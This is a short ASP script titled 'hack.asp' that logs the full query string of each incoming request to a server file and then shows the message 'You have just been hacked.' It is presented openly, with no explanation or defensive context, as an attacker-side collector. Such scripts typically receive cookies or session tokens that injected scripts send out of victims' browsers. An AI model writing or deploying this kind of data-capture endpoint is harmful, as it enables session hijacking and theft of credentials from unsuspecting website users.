------------------------------- hack.asp
------------------------------------
<%
Option Explicit

Const ForWriting = 2
Const ForAppending = 8
Const Create = True

Dim MyFile
Dim FSO ' FileSystemObject
Dim TSO ' TextStreamObject
Dim Str
Str = Request.ServerVariables("QUERY_STRING")

MyFile = Server.MapPath("./db/log.txt")

Set FSO =
Server.CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.OpenTextFile(MyFile, ForAppending,
Create)

if (Str <> "") then TSO.WriteLine Str

TSO.close
Set TSO = Nothing
Set FSO = Nothing
%>
<HTML>
<BODY>
You have just been hacked.
</BODY>
</HTML>
----------------------------------- EOF
-----------------------------------

